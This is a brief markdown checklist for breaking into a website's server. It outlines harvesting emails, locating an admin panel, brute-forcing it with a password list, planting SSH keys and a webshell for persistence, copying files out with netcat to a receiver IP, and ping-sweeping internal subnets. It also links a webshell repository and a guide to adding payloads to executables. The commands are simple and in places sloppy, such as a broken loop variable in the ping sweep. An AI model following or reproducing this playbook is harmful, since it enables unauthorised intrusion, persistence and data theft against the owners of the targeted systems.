# Steps:
get emails from site
find admin panel
use password list to get access

## steal ssh keys
### Create new SSH key
```
ssh-keygen 
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
```
Export the private key to any machine I want to use to conenct again. 
### use ssh key to login
To use ssh-copy-id, pass your username and the IP address of the server you would like to access:
```
ssh-copy-id your_username@192.0.2.0
ssh your_username@192.0.2.0
```
### upload keys
In another terminal on your local machine, use scp to copy the contents of your SSH public key (id_rsa.pub) into the authorized_keys file on your server. Substitute in your own username and your server’s IP address:
```
scp ~/.ssh/id_rsa.pub your_username@192.0.2.0:~/.ssh/authorized_keys
```
### server: 
1. .ssh/authorized_keys
### client: 
1. .ssh/id_rsa – Holds the private key for the client
2. .ssh/id_rsa.pub – Holds the public key for the client
3. .ssh/known_hosts – Holds a list of host signatures of hosts that the client has previously connected to



## install webshell for persistence 
https://github.com/tennc/webshell

## NetCat File Transfer:
nc is basically a built-in tool from any UNIX-like systems (even embedded systems), so it's perfect for "quick and temporary way to transfer files". open a listen on port 12345, waiting for data.

1. on the receiver side, run:
```
nc -l 12345 | tar -xf -
```
2. on the sender side:
```
tar -cf - ALL_FILES_YOU_WANT_TO_SEND ... | nc $RECEIVER_IP 12345
```
2a. 
You can also put pv in the middle to monitor the progress of transferring:
```
tar -cf - ALL_FILES_YOU_WANT_TO_SEND ...| pv | nc $RECEIVER_IP 12345
```
After the transferring is finished, both sides of nc will quit automatically, and job done.

### Scan the Interior Network: 
for i in {1..254}; do ping -c 1 192.168.1.i; done 

for i in {1..254}; do for x in {1..254}; do ping -c 1 10.0.x.i; done; done 


# References:
https://sathisharthars.com/2014/06/04/create-and-add-a-payload-in-existing-executable/
